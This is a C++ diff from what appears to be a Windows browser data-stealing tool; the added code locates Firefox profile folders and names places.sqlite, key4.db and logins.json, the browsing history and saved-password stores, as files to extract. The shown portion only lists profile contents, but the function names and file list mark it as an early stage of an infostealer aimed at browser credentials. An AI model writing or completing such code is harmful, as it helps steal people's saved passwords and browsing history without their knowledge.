@@ -2,14 +2,17 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <string>
-
+#include <vector>
 #include <windows.h>
 #include <shlobj.h>
+#include <filesystem>
 
 // #pragma comment(lib, "shell32.lib")
 
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
+
+namespace fs = std::filesystem;
 
 bool verify_browser_installation(const LPCWSTR p_name);
 void collect_firefox_data();
@@ -96,8 +99,19 @@ void collect_firefox_data() {
 	std::string path_to_extraction_directory = create_extraction_directory();
 	std::string path_to_appdata = get_local_appdata_path();
 	if (path_to_extraction_directory != "" && path_to_appdata != "") {
-		std::string firefox_path = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
-		std::cout << firefox_path << std::endl;
+		std::string path_to_profiles = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
+		std::vector<std::string> files_to_extract = {
+			"places.sqlite",		// Contains bookmarks, names of downloaded files, and websites visited
+			"key4.db",				// Passwords
+			"logins.json",			// Passwords
+		};
+
+		for (const auto& profile_path : fs::directory_iterator(path_to_profiles)) {
+			for (const auto& item : fs::directory_iterator(profile_path.path().string())) {
+				std::cout << item.path().string() << std::endl;
+			}
+		}
+
 	}
 }
 
